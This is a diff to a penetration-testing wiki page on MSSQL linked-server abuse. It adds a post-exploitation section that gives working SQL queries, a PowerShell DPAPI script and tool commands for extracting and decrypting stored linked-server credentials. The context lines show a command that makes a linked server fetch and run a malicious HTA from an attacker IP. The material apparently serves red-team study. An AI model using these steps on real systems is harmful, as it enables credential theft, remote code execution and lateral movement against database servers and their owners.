@@ -323,7 +323,7 @@ You probably will be able to **escalate to Administrator or NT AUTHORITY\SYSTEM*
 
 ### Linked SQL Servers Abuse
 
-[Linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
+[Linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server. From an attacking perspective, misconfigured linked servers can enable privilege escalation, lateral movement, and unauthorized data access by pivoting through trusted database connections.
 
 {% tabs %}
 {% tab title="Ennumerate" %}
@@ -370,6 +370,91 @@ mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth exec whoami -link-n
 mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -link-name <LINKED_SRV_NAME> exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
 ```
 {% endtab %}
+
+{% tab title="Post-Exploit" %}
+### Decrypting Linked Server Passwords
+
+After compromising a machine hosting an MSSQL Server instance with linked servers, an attacker can extract and decrypt the credentials used for linked server authentication (MSSQL Server Authentication).
+
+To do so, you need to have:
+
+* A login with **`sysadmin`** role on the SQL Server instance.
+* **`Local administrator`** privileges on the underlying Windows server.
+
+{% hint style="info" %}
+If local administrators don’t have sysadmin privileges you’ll just have to impersonate the MSSQL server account or local SYSTEM account. More details [here](https://www.netspi.com/blog/entryid/133/sql-server-local-authorization-bypass/).
+{% endhint %}
+
+MSSQL stores link server information, including the encrypted password, in **`master.sys.syslnklgns`** table. Specifically, the encrypted password is stored in the `pwdhash` column (even though it’s not a hash).&#x20;
+
+The `master.sys.syslnklgns` table cannot be accessed using a normal SQL connection, but rather a [Dedicated Administrative Connection (DAC)](https://technet.microsoft.com/en-us/library/ms178068\(v=sql.105\).aspx) is needed. By default, DACs may only be created locally (controlled by the [remote admin connections](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/remote-admin-connections-server-configuration-option?view=sql-server-ver16) configuration option).&#x20;
+
+These credentials stored in `master.sys.syslnklgns` are symmetrically encrypted with the [Service Master Key](https://learn.microsoft.com/en-us/sql/relational-databases/security/encryption/sql-server-and-database-encryption-keys-database-engine?view=sql-server-ver16\&redirectedfrom=MSDN), which is stored inside the [sys.key\_encryptions](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-key-encryptions-transact-sql?view=sql-server-ver16) table with a `key_id` value of `102`.  SMK is encrypted using Windows Data Protection API (DPAPI) and there are two versions of it in the database:
+
+* One encrypted as `LocalMachine` (with `thumbprint` set to `0x01` )
+* One encrypted in the context of `CurrentUser` ,meaning the SQL Server service account .
+
+We generally choose the LocalMachine option as it can be decrypted without needing to impersonate the service account.
+
+Additional entropy is added to strengthen the encryption but the entropy bytes can be found in the registry at `HKLM:SOFTWAREMicrosoftMicrosoft SQL Server[instancename]SecurityEntropy`.
+
+#### Manually
+
+One connected on MSSQL via DAC, we can enumerate and retreive encrypted credentials as follows.
+
+```powershell
+# Enum and retreive pwdhash
+SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash FROM master.sys.syslnklgns INNER JOIN master.sys.sysservers ON syslnklgns.srvid = sysservers.srvid WHERE LEN(pwdhash) > 0;
+
+# Retreive the SMK - choose the one with a thumbprint different than 0x01
+SELECT * FROM sys.key_encryptions;
+```
+
+We can then use following Powershell script, as Local Administrator,  **to decrypt the Service Master Key**:
+
+```powershell
+$encryptedData = "0xABCD<SMK_HERE>";
+$encryptedData = $encryptedData.Substring(18); # Remove 0x and padding
+$encryptedData = [byte[]] -split ($encryptedData -replace '..', '0x$& ');
+
+# Edit the registry key if needed
+$entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy;
+
+Add-Type -AssemblyName System.Security;
+$SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine');
+Write-Host (($SMK|ForEach-Object ToString X2) -join '');
+```
+
+Results of previous script is the hex-encoded decrypted SMK, which can now be used to decrypt the `pwdhash`.&#x20;
+
+Since [MSSQL Server 2012](https://learn.microsoft.com/en-us/sql/relational-databases/security/encryption/sql-server-and-database-encryption-keys-database-engine?view=sql-server-ver16), the `Service Master Key` is used with `AES` for encryption ( `3DES` was used before) . We can then decrypt the credentials using the following parameters:&#x20;
+
+* The `IV` is the first 16 bytes of `pwdhash`(after padding)
+* The `Ciphertext` is the remaining bytes from  `pwdhash`
+* The `Key` is the `Service Master Key`&#x20;
+
+Instead of doing this manually, we can split the pwhash using the following SQL query
+
+```sql
+SELECT
+	name,
+	SUBSTRING(pwdhash, 5, 16) AS 'IV',
+	SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext'
+FROM sys.syslnklgns
+WHERE LEN(pwdhash) > 0;
+```
+
+We can finally use this [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=AES_Decrypt\(%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D\)Decode_text\('UTF-16LE%20\(1200\)'\)) to decrypt pwdhash !
+
+#### Automated -  Get-MSSQLLinkPasswords
+
+We can automate this process with the [Get-MSSQLLinkPasswords](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1) (Powershell) script. It should be run as a Local Administrator with a **`sysadmin`** role on the SQL Server instance.
+
+```powershell
+Import-Module .\Get-MSSQLLinkPasswords.psm1
+Get-MSSQLLinkPasswords
+```
+{% endtab %}
 {% endtabs %}
 
 ## Resources
@@ -377,3 +462,5 @@ mssqlpwner <DOMAIN>/<USER>:<PASSWORD>@<TARGET> -windows-auth -link-name <LINKED_
 {% embed url="https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/" %}
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-serve" %}
+
+{% embed url="https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-database-link-server-passwords/" %}
